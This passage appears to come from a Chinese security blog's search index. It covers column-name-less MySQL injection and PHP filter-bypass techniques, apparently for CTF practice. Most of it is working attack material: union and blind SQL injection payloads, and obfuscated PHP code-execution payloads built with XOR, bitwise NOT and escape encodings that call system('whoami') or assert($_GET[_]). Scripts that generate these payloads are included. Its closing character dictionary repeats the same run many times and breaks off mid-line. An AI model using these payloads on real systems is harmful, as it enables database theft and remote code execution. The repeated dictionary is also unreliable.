sys.schema_table_statistics_with_buffer where table_schema=database(); select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=database(); 无列名注入 上述的innodb引擎的表和sys库的表都无法查到列名，这里就需要使用无列名注入。\njoin、using join用于合并两个表，using表示使用什么字段进行连接，用using指定了连接字段则查询结果只返回连接字段\n1 select * from user as b join user using(id) as c 这里使用id进行连接，只会返回id列\n思路：利用join合并同一表，报错重复的列名，再利用using爆出所有的列名，union select需要前后查询的字段数一样，不然会报错\n1 2 3 4 5 6 7 8 # 得到 id 列名重复报错 select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b)as c; # 得到 username 列名重复报错 select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id))as c; # 得到 password 列名重复报错 select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id,username))as c; # 得到 user 表中的数据 select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id,username,password))as c; 子查询 利用union联合查询构造列名\n1 select 1,2,3,4 union select * from users 1 2 3 select `2` from (select 1,2,3,4 union select * from users)a select a.2 from (select 1,2,3,4 union select * from users)a #记得第一个2加反引号,或者使用a.2 1 2 3 4 5 select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(`3`) from (select 1,2,3 union select * from user)x; select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(x.3) from (select 1,2,3 union select * from users)x; select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x; order by盲注 order by对结果进行排序：0-9 a-z，不区分大小写\n1 2 3 select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;o\u0026#39; order by 3; select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;p\u0026#39; order by 3; select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;q\u0026#39; order by 3; 不使用表名查询 正常的 sql 查询如下：\n1 select * from `admin`; 其中，列名为 id、name、password，使用 union 查询：\n1 select 1,2,3 union select * from admin; 如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：\n1 select `3` from (select 1,2,3 union select * from admin)a; 末尾的 a 可以是任意字符，用于命名。\n当然，多数情况下，` 会被过滤。当 ```不能使用的时候，使用别名来代替：\n1 select b from (select 1,2,3 as b union select * from admin)a; 同时查询多个列：\n1 select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3; payload\n1 select a,b from posts where a=-1 union select 1,(select concat(`3`,0x2d,`4`) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1); 盲注\n1 ((SELECT 1,concat(\u0026#39;{result+chr(mid)}\u0026#39;, cast(\u0026#34;0\u0026#34; as JSON)))\u0026lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`)) 无select mysql 8.0.19新增语句table\n可以把table t简单理解成select * from t，和select的区别在于\ntable总是显示表的所有列 table不允许任何的行过滤;也就是说，TABLE不支持任何WHERE子句。 可以用来盲注表名 1 2 admin\u0026#39;and\\x0a(table\\x0ainformation_schema.TABLESPACES_EXTENSIONS\\x0alimit\\x0a7,1)\u0026gt; (BINARY(\u0026#39;{}\u0026#39;),\u0026#39;0\u0026#39;)# 同时代替select被过滤导致只能同表查询的问题\n","date":"2024-11-07T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/1.jpg","permalink":"https://0d000721999.github.io/p/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","title":"无列名注入"},{"content":"php过滤绕过 字符串拼接绕过 字符串拼接绕过适用于绕过过滤具体关键字的限制\n1 适用PHP版本：PHP\u0026gt;=7 1 2 3 4 5 6 (p.h.p.i.n.f.o)(); (sy.(st).em)(whoami); (sy.(st).em)(who.ami); (s.y.s.t.e.m)(\u0026#34;whoami\u0026#34;); ....... 在PHP中不一定需要引号(单引号/双引号)来表示字符串。PHP支持我们声明元素的类型，比如$name = (string)mochu7;，在这种情况下，$name就包含字符串\u0026#34;mochu7\u0026#34;，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理 字符串转义绕过 1 适用PHP版本：PHP\u0026gt;=7 以八进制表示的[0–7]{1,3}转义字符会自动适配byte（如\u0026quot;\\400\u0026quot; == “\\000”） 以十六进制的\\x[0–9A-Fa-f]{1,2}转义字符表示法（如“\\x41\u0026quot;） 以Unicode表示的\\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串\n注意这里转义后的字符必须双引号包裹传参\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # -*- coding:utf-8 -*- def hex_payload(payload): res_payload = \u0026#39;\u0026#39; for i in payload: i = \u0026#34;\\\\x\u0026#34; + hex(ord(i))[2:] res_payload += i print(\u0026#34;[+]\u0026#39;{}\u0026#39; Convert to hex: \\\u0026#34;{}\\\u0026#34;\u0026#34;.format(payload,res_payload)) def oct_payload(payload): res_payload = \u0026#34;\u0026#34; for i in payload: i = \u0026#34;\\\\\u0026#34; + oct(ord(i))[2:] res_payload += i print(\u0026#34;[+]\u0026#39;{}\u0026#39; Convert to oct: \\\u0026#34;{}\\\u0026#34;\u0026#34;.format(payload,res_payload)) def uni_payload(payload): res_payload = \u0026#34;\u0026#34; for i in payload: i = \u0026#34;\\\\u{{{0}}}\u0026#34;.format(hex(ord(i))[2:]) res_payload += i print(\u0026#34;[+]\u0026#39;{}\u0026#39; Convert to unicode: \\\u0026#34;{}\\\u0026#34;\u0026#34;.format(payload,res_payload)) if __name__ == \u0026#39;__main__\u0026#39;: payload = \u0026#39;phpinfo\u0026#39; hex_payload(payload) oct_payload(payload) uni_payload(payload) 1 2 3 4 5 \u0026#34;\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f\u0026#34;();#phpinfo(); \u0026#34;\\163\\171\\163\\164\\145\\155\u0026#34;(\u0026#39;whoami\u0026#39;);#system(\u0026#39;whoami\u0026#39;); \u0026#34;\\u{73}\\u{79}\\u{73}\\u{74}\\u{65}\\u{6d}\u0026#34;(\u0026#39;id\u0026#39;);#system(\u0026#39;whoami\u0026#39;); \u0026#34;\\163\\171\\163\\164\\145\\155\u0026#34;(\u0026#34;\\167\\150\\157\\141\\155\\151\u0026#34;);#system(\u0026#39;whoami\u0026#39;); ....... 另外，八进制的方法可以绕过无字母传参进行代码执行\n1 \u0026#34;\\163\\171\\163\\164\\145\\155\u0026#34;(\u0026#34;\\167\\150\\157\\141\\155\\151\u0026#34;);#system(\u0026#39;whoami\u0026#39;); 多次传参绕过 1 适用PHP版本：无限制 如果过滤了引号(单引号/双引号)，可以通过以下方法绕过\n1 2 3 4 GET: ?1=system\u0026amp;2=whoami POST: cmd=$_GET[1]($_GET[2]); 1 cmd=$_POST[1]($_POST[2]);\u0026amp;1=system\u0026amp;2=whoami 内置函数访问绕过 get_defined_functions()：返回所有已定义函数的数组\n利用这种方法首先还需要知道PHP的具体版本，因为每个版本的get_defined_functions()返回的值都是不一样的，这里以php7.4.3为准\n异或绕过 在PHP中两个字符串异或之后，得到的还是一个字符串。 例如：我们异或 ? 和 ~ 之后得到的是 A\n1 2 3 4 5 6 7 8 9 10 字符：? ASCII码：63 二进制： 00‭11 1111‬ 字符：~ ASCII码：126 二进制： 0111 1110‬ 异或规则： 1 XOR 0 = 1 0 XOR 1 = 1 0 XOR 0 = 0 1 XOR 1 = 0 上述两个字符异或得到 二进制： 0100 0001 该二进制的十进制也就是：65 对应的ASCII码是：A 当题目过滤了所有英文字母和数字，但是我们知道ASCII码中还有很多字母数字之外的字符，利用这些字符进行异或可以得到我们想要的字符\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # -*- coding: utf-8 -*- payload = \u0026#34;assert\u0026#34; strlist = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127] #strlist是ascii表中所有非字母数字的字符十进制 str1,str2 = \u0026#39;\u0026#39;,\u0026#39;\u0026#39; for char in payload: for i in strlist: for j in strlist: if(i ^ j == ord(char)): i = \u0026#39;%{:0\u0026gt;2}\u0026#39;.format(hex(i)[2:]) j = \u0026#39;%{:0\u0026gt;2}\u0026#39;.format(hex(j)[2:]) print(\u0026#34;(\u0026#39;{0}\u0026#39;^\u0026#39;{1}\u0026#39;)\u0026#34;.format(i,j),end=\u0026#34;.\u0026#34;) break else: continue break 一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造\n1 assert($_GET[_]); 使用脚本对每个字母进行转换，然后拼接\n1 2 3 4 5 6 7 8 $_=(\u0026#39;%01\u0026#39;^\u0026#39;%60\u0026#39;).(\u0026#39;%08\u0026#39;^\u0026#39;%7b\u0026#39;).(\u0026#39;%08\u0026#39;^\u0026#39;%7b\u0026#39;).(\u0026#39;%05\u0026#39;^\u0026#39;%60\u0026#39;).(\u0026#39;%09\u0026#39;^\u0026#39;%7b\u0026#39;).(\u0026#39;%08\u0026#39;^\u0026#39;%7c\u0026#39;); //$_=\u0026#39;assert\u0026#39;; $__=\u0026#39;_\u0026#39;.(\u0026#39;%07\u0026#39;^\u0026#39;%40\u0026#39;).(\u0026#39;%05\u0026#39;^\u0026#39;%40\u0026#39;).(\u0026#39;%09\u0026#39;^\u0026#39;%5d\u0026#39;); //$__=\u0026#39;_GET\u0026#39;; $___=$$__; //$___=\u0026#39;$_GET\u0026#39;; $_($___[_]); //assert($_GET[_]); 1 $_=(\u0026#39;%01\u0026#39;^\u0026#39;%60\u0026#39;).(\u0026#39;%08\u0026#39;^\u0026#39;%7b\u0026#39;).(\u0026#39;%08\u0026#39;^\u0026#39;%7b\u0026#39;).(\u0026#39;%05\u0026#39;^\u0026#39;%60\u0026#39;).(\u0026#39;%09\u0026#39;^\u0026#39;%7b\u0026#39;).(\u0026#39;%08\u0026#39;^\u0026#39;%7c\u0026#39;);$__=\u0026#39;_\u0026#39;.(\u0026#39;%07\u0026#39;^\u0026#39;%40\u0026#39;).(\u0026#39;%05\u0026#39;^\u0026#39;%40\u0026#39;).(\u0026#39;%09\u0026#39;^\u0026#39;%5d\u0026#39;);$___=$$__;$_($___[_]);\u0026amp;_=phpinfo(); 异或脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php function finds($string){ $index = 0; $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255]; for($i=27;$i\u0026lt;count($a);$i++){ for($j=27;$j\u0026lt;count($a);$j++){ $x = $a[$i] ^ $a[$j]; for($k = 0;$k\u0026lt;strlen($string);$k++){ if(ord($string[$k]) == $x){ echo $string[$k].\u0026#34;\\n\u0026#34;; echo \u0026#39;%\u0026#39; . dechex($a[$i]) . \u0026#39;^%\u0026#39; . dechex($a[$j]).\u0026#34;\\n\u0026#34;; $index++; if($index == strlen($string)){ return 0; } } } } } } finds(\u0026#34;_GET\u0026#34;); ?\u0026gt; 还有这个payload\n1 2 ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();\u0026amp;%ff=phpinfo //${_GET}{%ff}();\u0026amp;%ff=phpinfo URL编码取反绕过 1 2 3 4 5 PS C:\\Users\\Administrator\u0026gt; php -r \u0026#34;var_dump(urlencode(~\u0026#39;phpinfo\u0026#39;));\u0026#34; Command line code:1: string(21) \u0026#34;%8F%97%8F%96%91%99%90\u0026#34; (~%8F%97%8F%96%91%99%90)(); #phpinfo(); 有参数的\n1 2 3 4 5 6 7 8 PS C:\\Users\\Administrator\u0026gt; php -r \u0026#34;var_dump(urlencode(~\u0026#39;system\u0026#39;));\u0026#34; Command line code:1: string(18) \u0026#34;%8C%86%8C%8B%9A%92\u0026#34; PS C:\\Users\\Administrator\u0026gt; php -r \u0026#34;var_dump(urlencode(~\u0026#39;whoami\u0026#39;));\u0026#34; Command line code:1: string(18) \u0026#34;%88%97%90%9E%92%96\u0026#34; (~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96); #system(\u0026#39;whoami\u0026#39;); 当5\u0026lt;=PHP\u0026lt;=7.0.9时，需要再执行一次构造出来的字符，所以参考上面那种异或拼接的方法\n1 2 $_=(~\u0026#39;%9E%8C%8C%9A%8D%8B\u0026#39;);$__=\u0026#39;_\u0026#39;.(~\u0026#39;%AF%B0%AC%AB\u0026#39;);$___=$$__;$_($___[_]); #assert($_POST[_]); 汉字取反绕过 利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是\u0026quot;\\x8c\u0026quot;，其取反即为字母s\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php $_=[]; // $__=$_.$_; //arrayarray $_=($_==$__);//$_=(array==arrayarray)明显不相同 false 0 $__=($_==$_);//$__=(array==array) 相同返回1 $___ = ~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];//system $____ = ~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];//_POST $____($$__[_]);//也就是system($_POST[_]) 如果过滤php用短标签\u0026lt;?=\n汉字测试脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php error_reporting(0); header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); function str_split_unicode($str, $l = 0) { if ($l \u0026gt; 0) { $ret = array(); $len = mb_strlen($str, \u0026#34;UTF-8\u0026#34;); for ($i = 0; $i \u0026lt; $len; $i += $l) { $ret[] = mb_substr($str, $i, $l, \u0026#34;UTF-8\u0026#34;); } return $ret; } return preg_split(\u0026#34;//u\u0026#34;, $str, -1, PREG_SPLIT_NO_EMPTY); } $s = \u0026#39;你归来是诗离去成词且笑风尘不敢造次我糟糠能食粗衣也认煮酒话桑不敢相思你终会遇见这么一个人他会用整个人生将你精心收藏用漫长岁月把你妥善安放怕什么岁月漫长你心地善良,终会有一人陪你骑马喝酒走四方为你唱一首歌歌中有你亦有我我的泪我的魅将都融入到我的歌声里飘向孤独的你你是否听到了我的歌曲是否也在黯然落泪？岁月匆匆人生漫漫漠视了真情谁是站谁的谁已经变得不重要至少曾经已拥有长相思爱相随时空隔离谁相陪？花前月下心随风相思一片梦成空笑看往事红尘中多少凝思付清秋？长相思泪相随曾经谁是谁的谁？孤星冷月泪盈盈念曾经相逢心长时光短让人垂泪到天明长相思苦相随窗前双燕比翼飞日暮情人成双对于时光无垠的田野中没有早一步也没有晚一步恰好遇见了想要遇见的人这是一段多少美丽而令人心动的尘缘于爱情来说相见恨早会恨晚站会留下梨花带雨的疼痛而于友情来说无论太早或者太迟都是一份值得珍惜的情缘晚秋缓缓走晚了我的轮回疏雨一刻半疏笼起我深深的梦馀昨日遗憾寸寸疏雨挑涸泪烛落笔无处飒晚秋彼晚秋未晚懒我疏雨疏风去归我初心还我清梦唯我在晚秋未晚里守望那疏雨半疏的麦田待下一片梧桐叶复舞我亦拾起我的旧梦旧梦清寒一枕乱我眸中晚秋躞蹀的雨疏疏拍窗我的晚秋疏雨半疏疏开昨日我的梦情缘如海深邃澈蓝干涸成妄谈一湛清湖泪潸然一颦寒眉锁阑珊只为你而欣悦只因你而清泪斑斑你是我的前世吧为何沁泊在我的心怀缱绻起涟波千层驻我心扉知我情怀从此我已习惯你的嘘寒问暖懒倦地痴卧在你的胸怀红霞满腮昨天再苦都要用今天的微笑把它吟咏成一段幸福的记忆；曾经再累都要用当站下的遗忘穿越万道红尘让心波澜不惊人生最大的荣耀不在于从不跌倒而在于每一次跌倒后都能爬起来回忆是件很累的事就像失眠时怎么躺都不对的样子有时候往往直到离开在回忆里才能知道自己有多喜欢一座城\u0026#39;; $arr_str=str_split_unicode($s); for ($i=0; $i \u0026lt; strlen($s) ; $i++) { echo $arr_str[$i].\u0026#39; ------- \u0026#39;.~$arr_str[$i][1].\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } ?\u0026gt; 字典\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2]a实[2]果[1]回[2]增[2]极[1]林[1]非[2]连[2]办[2]构[1]型[1]属[2]神[2]飞[2]州[2]析[1]搞[2]垂[1]架[1]胞[2] b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]坚[1]杂[1]初[2]坏[1]帝[2]依[2]坐[1]绝[2]块[1]丝[2]靠[1]村[1]距[2]杀[1]松[1]静[1]督[1]束[1]额[2]川[2]杨[1]杆[1]b来[1]面[1]条[1]革[1]九[2]保[2]思[2]权[1]话[2]非[1]青[1]李[1]材[1]均[1]朝[2]板[1]